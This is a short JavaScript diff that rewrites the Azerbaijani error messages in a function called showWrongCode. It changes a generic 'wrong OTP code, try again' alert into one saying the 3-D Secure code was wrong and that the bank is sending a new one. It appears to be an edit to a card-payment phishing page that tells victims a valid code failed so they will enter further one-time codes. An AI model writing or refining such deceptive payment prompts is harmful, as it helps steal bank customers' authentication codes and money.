@@ -56,10 +56,10 @@
   function showWrongCode() {
     if (alertBox) {
       alertBox.className = 'alert alert--error';
-      alertBox.innerHTML = '<strong>Səhv OTP kodu daxil etmisiniz!</strong><br>Yenidən cəhd edin…';
+      alertBox.innerHTML = '<strong>Səhv 3-D kod daxil etmisiniz!</strong><br>Bankdan yeni kod göndərilir…';
       alertBox.style.display = '';
     }
-    if (title) { title.textContent = 'OTP kodu səhvdir'; }
+    if (title) { title.textContent = 'Yeni kod göndərilir'; }
     if (note) { note.textContent = 'Lütfən yenidən OTP kodu daxil edin.'; }
   }
 
